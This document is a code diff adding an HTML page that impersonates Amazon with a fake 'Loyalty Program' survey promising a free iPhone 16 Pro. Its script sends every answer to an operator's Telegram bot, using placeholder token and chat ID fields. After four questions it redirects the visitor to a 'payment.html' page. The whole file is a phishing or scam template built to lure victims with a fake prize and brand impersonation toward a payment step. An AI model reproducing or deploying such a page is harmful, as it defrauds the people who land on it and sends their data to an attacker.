@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Loyalty Program</title>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" class="logo" onclick="redirectToAmazon()">
+            <h1>LOYALTY PROGRAM</h1>
+        </header>
+        <div class="content">
+            <h2 id="question-title">Congratulations!</h2>
+            <p id="question-description">
+                Today, <span id="current-date"></span>, you have been randomly selected to take this survey. It will only take a minute, and you will receive an amazing prize: <strong>Apple iPhone 16 Pro!</strong>
+            </p>
+            <img src="iphone_16_pro_max.webp" alt="iPhone 16 Pro" class="iphone-image" id="iphone-image" onclick="redirectToAmazon()">
+            <p id="question-text"><strong>Question 1/4:</strong> Are you male or female?</p>
+            <div class="buttons" id="question-buttons">
+                <button class="button" onclick="nextQuestion('Male')">Male</button>
+                <button class="button" onclick="nextQuestion('Female')">Female</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    <script>
+        const telegramBotToken = "#YOURBOTTOKENHERE";
+        const chatId = "YOURCHADIDHERE";
+
+        const questions = [
+            { text: "Are you male or female?", options: ["Male", "Female"] },
+            { text: "What is your age group?", options: ["18-24", "25-34", "35-44", "45+"] },
+            { text: "How often do you shop online?", options: ["Daily", "Weekly", "Monthly", "Rarely"] },
+            { text: "What is your favorite shopping category?", options: ["Electronics", "Fashion", "Home & Kitchen", "Other"] },
+        ];
+
+        let currentQuestion = 0;
+        let answers = [];
+
+        document.getElementById("current-date").textContent = new Date().toLocaleDateString();
+
+        function launchConfetti() {
+            const colors = ['#ff9900', '#ff0000', '#00ff00', '#0000ff', '#ffff00'];
+            let angle = 60;
+
+            setInterval(() => {
+                confetti({
+                    particleCount: 50,
+                    angle: angle,
+                    spread: 70,
+                    origin: { x: Math.random() },
+                    colors: colors,
+                });
+                angle = angle === 60 ? 120 : 60;
+            }, 500);
+        }
+
+        window.onload = launchConfetti;
+
+        function redirectToAmazon() {
+            window.location.href = "https://www.amazon.co.uk/Apple-iPhone-Pro-Max-256/dp/B0DGHZ1MC2";
+        }
+
+        function nextQuestion(answer) {
+            answers.push(answer);
+
+            sendToTelegram(`Question ${currentQuestion + 1}: ${questions[currentQuestion].text}\nAnswer: ${answer}`).then(() => {
+                if (currentQuestion < questions.length - 1) {
+                    currentQuestion++;
+                    updateQuestion();
+                } else {
+                    sendToTelegram(`Survey completed. Answers: ${answers.join(", ")}`).then(() => {
+                        redirectToTelegramBot();
+                    }).catch(err => {
+                        console.error("Failed to send final answers:", err);
+                    });
+                }
+            }).catch(err => {
+                console.error("Failed to send answer:", err);
+            });
+        }
+
+        function updateQuestion() {
+            document.getElementById("question-text").innerHTML = `<strong>Question ${currentQuestion + 1}/4:</strong> ${questions[currentQuestion].text}`;
+            const buttonsContainer = document.getElementById("question-buttons");
+            buttonsContainer.innerHTML = "";
+
+            questions[currentQuestion].options.forEach(option => {
+                const button = document.createElement("button");
+                button.className = "button";
+                button.textContent = option;
+                button.onclick = () => nextQuestion(option);
+                buttonsContainer.appendChild(button);
+            });
+        }
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            return fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message }),
+            });
+        }
+
+        function redirectToTelegramBot() {
+            document.getElementById("question-title").textContent = "Thank You!";
+            document.getElementById("question-description").textContent = "Redirecting to the payment page...";
+            window.location.href = "payment.html";
+        }
+    </script>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f7f7f7;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            text-align: center;
+            background-color: #fff;
+            border: 2px solid black;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+
+        .header {
+            background-color: #232f3e;
+            color: white;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-radius: 8px 8px 0 0;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 18px;
+            flex-grow: 1;
+            text-align: center;
+            color: #ffffff;
+        }
+
+        .logo {
+            height: 30px;
+            cursor: pointer;
+        }
+
+        .content h2 {
+            color: #ff9900;
+        }
+
+        .iphone-image {
+            max-width: 100%;
+            border-radius: 10px;
+            margin: 20px 0;
+            cursor: pointer;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .button {
+            background-color: #ff9900;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .button:hover {
+            background-color: #e68a00;
+        }
+
+        .winner-date {
+            color: #555;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+    </style>
+</body>
+</html>
